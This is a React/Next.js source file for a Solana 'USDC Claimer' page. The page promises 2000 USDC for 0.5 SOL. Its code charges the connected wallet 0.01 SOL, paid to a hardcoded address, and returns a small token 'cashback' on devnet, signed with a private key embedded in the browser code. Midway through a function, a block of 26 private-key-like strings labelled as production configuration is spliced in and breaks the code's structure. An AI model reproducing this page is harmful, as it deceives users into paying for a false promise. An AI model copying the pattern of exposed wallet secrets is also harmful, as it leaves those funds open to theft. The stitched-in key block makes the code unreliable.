/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3KKBaMEwtv9tz4XMStVHNhishEXaKZcaS3VBZvw9umdU1HGpHNhStCS1vMrvRXm5TSAvGYYnm5zj1hZT5KZoLQF3"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "uLWdnviW7T4BQrq7wvtwFvWpuXHgbfm11VtzqnkYhRazNGqdxSJtMcdgYEUQBB8h1TtMAoMCRFoNMXp2rqijwjv",
  "key1": "3WTVKeWcZGnTFxgHxbQsktruwnN284EbW1Vj1WnUaEgw4S8HX31Em9nQXQD4pjcnBYoPp4wpGfWQBwb2ZEBRzMTj",
  "key2": "2RDSfo2GFYCFT2BJ7btxFVYPrvf4qEKNhvgtbWmLFEs4qqZJfT9owoKSDRWQYEgxyDtt7aHLvnAgwUtpcqwCEZJr",
  "key3": "2dRhMG2iQhh5Jdz5tLgrp49VjU5Z9nmMJEZmnsJznGHniRJdk6nhm14T5oT8PCqGp8FgRSoNjMfFQfN6bkkMoePK",
  "key4": "2w16fHnBk7bs5xaadBgwxCboMDsJV6KtKn4BnFHFiCigptg7NjgTAv3wAY8n5PjUahaz49VFjTtkzj38fVuYwKgu",
  "key5": "4EmuSXaLSrAkazKAZbgPQ5JsWMXatpacw7DE7vPKUWJCgxN4LeYVeU3TQM9xGDMr2MYWq5Woon1vTsLwF7ZSAqEH",
  "key6": "26Bwk8Le2nEumMmWDf8TUtT9xWUoyUWxaKSmo4tghZchRMkZBSXSwy1T3DWFdxm8LhgdtdhTYUXJNHaHECk5DByu",
  "key7": "4YoaRjDUiUA2gf3Pxr76iPDbSt97T4NwgpT7dZUpj5YrP293qz8S9M78Bj3dCaWAWyj36FPL3z2yVrfnhABzsQGB",
  "key8": "5DdyhtibwPeqQBRdqN9UXiRcmYAgpFuG6nbBwgYtQ3QXjMRosjG9YSaVd1emxtbZcXZLJxyKpmstgyB7Gfcmvk7e",
  "key9": "41iCmQNVHLCSTizRfHQVaGkr9mJqusKZ9b9P9PoSesbTxQEeUGKY6TPUDbem59uduLacxD62u6xvunV4PfwFwna2",
  "key10": "3ZYjbadHHtbU6mUjD1w21Z3TD7uYagF6XeXMQnKSTMZi8aB8BeTRdUR5uEhRaTyqtgyaAtXChFGczhJRzgKAXDyt",
  "key11": "4yCtzygmcHuZNZPyHrJKZkTMm8mFYCeW2F9nA7Be1QR7HraPd3EPskG3ztWBrHGfqruLXuYdsDktPjHjjXv4w45Y",
  "key12": "ZP9shWgoQwXCLDrjydKCU54Xf4YxW6iwsPKxzUTGqP35B9yoJ1bS7zuh22Uwok59HeqwZ2XGiv12BLeUgUUn39y",
  "key13": "M2qks19ykFxE6UVhYx83ayjs4GDA6yZqVg6KJTf98TDAon4ZrKeSZa1MvE36TQPYKoPGjCsngFfQfutnwkRUGR3",
  "key14": "5eUAEohMaYkyEE7Yn974BhZb9DGymWuJWFtU8TZiyCQa8C9Qg6gYgmZitjvquqD7eYLpo2UQofmykuEERkjSqw6g",
  "key15": "3sW5uB8JSRGnj1uohEp6uTRXi4EGRQFw1kTiq8KXzUsqHKPwJcKc1YuNcibQhauSa431WjHPNxkQ4kMBkjvSGAfx",
  "key16": "568syr9BEhJrvbiP6LC2cp2Hwe8ApaJP1bQNsPvsdvmPMENoFGcDnsBJBkUnBUP6cgk8CL8XE1VYw3SXaLx2HtU2",
  "key17": "2C9bCGvY75Zgeu5jAhok7vxS8JQfiWazTgsGrYdax15RWRMUGsvvp7uJCi5umW8TEaZuWUwBZFp9xsbCCbmqySFU",
  "key18": "5jjSGmCvi51UEmDAXXX3V6Rn3sMGqWEYVHxsiQPX7DW67729yykgeBKBMsS3EGGFTsX2iZkkMoR15v2pVNRwFrf5",
  "key19": "5HKXxLzM8e2LqtaUi1UEr7FtBK1SPjFtaaS79ezbsxUyWo2UVUpkN66nFiZanrQEyw879Ga4w5azTGTiSorBa6Mc",
  "key20": "3KEX6mEsEwpca7Wc3yBz3PqCK7fdKFrFrXeiAgArQfDqkQV41K5ANzToBrm5hjzdaHED7m1XVhwwKEtJH8dTpMJF",
  "key21": "tDuRsWdrZDfn5nkZGQs1yLh5eJitVS4fRiQPcsD2cgy8mkLM4twQUkwTtkgc5zooGBzNuWaSn2FZSifSEXc1W17",
  "key22": "7s3omTQQwWEJTXe7v2BGeUxHxuaQNeVsyxaatLKj48JaigQk7J5bFvuUbU6xntAYoxJJy3VVYtHoHdQmPQrRc3f",
  "key23": "2hCNB2S9XgnJepxWjA2aapbJWfKA2vuiNDG6bhnQm4hoUD48C6aAv2fHTedi8XtCABKQQnitRi6h5kAfEJEkDjBk",
  "key24": "2LL71VLN1MqkkL5jR4cLN9sZfRFCa36KhzcCWSNxrnhtq8Aq71t1yAXovQJLMxDDa6HxNy8NdNFctwvYAQ9vPHN5",
  "key25": "4AveTBXNR488B5uUgvk8CQpa3QGb6Tjs8orn7YVBtsEVwKwrnNrQFjRD8mDxE6SnmmcpJWh8gvP5m514p2QtE5Ab"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
